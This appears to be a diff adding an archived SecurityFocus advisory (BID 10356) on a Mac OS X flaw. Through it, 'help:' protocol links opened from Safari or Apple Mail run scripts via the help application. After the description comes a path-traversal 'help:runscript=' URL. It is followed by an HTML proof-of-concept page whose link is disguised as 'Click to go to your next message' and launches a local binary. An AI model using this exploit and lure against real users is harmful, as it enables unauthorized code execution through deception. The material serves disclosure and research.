@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/10356/info
+
+It has been reported that Mac OS X may be prone to a vulnerability that could allow a remote attacker to execute arbitrary script code on a vulnerable system. 
+
+The issue presents itself due to the 'help:' protocol implemented by the Mac OS X help application. It has been reported that the 'help:' protocol can be invoked remotely by the Safari web browser. This could allow an attacker to craft a malicious link and entice a user to follow the link in order to execute script code via the help application. It has been reported that this issue can be exploited to execute arbitrary code with minimal user interaction. Reportedly, an attacker can exploit this issue by simply enticing a user to visit a malicious site.
+
+An attacker can also use HTML email as an attack vector to exploit this vulnerability. For example, an attacker can embed HTML into Apple Mail and send it as a link to a vulnerable user. If the user follows the link, script code will be executed.
+
+Successful exploitation of this issue may allow a remote attacker to gain unauthorized access to a vulnerable system in the context of an affected user.
+
+Mac OS X 10.3 is reported to be prone to this issue, however, it is possible that prior versions are affected as well. Other web browsers that support the 'help:' protocol may also present an attack vector for this issue.
+
+help:runscript=../../Scripts/Info Scripts/Current Date & Time.scpt
+
+The following proof of concept is available as well:
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+? ? <meta content="text/html;charset=ISO-8859-1"
+http-equiv="Content-Type">
+? ? <title></title>
+</head>
+<body bgcolor="#ffffff" text="#000000">
+<a
+? href="help:runscript=MacHelp.help/Contents/Resourc
+es/English.lproj/shrd/OpnApp.scpt%20string=%27usr: bin:du%27">Click to
+go to your next message</a><br>
+</body>
+</html>
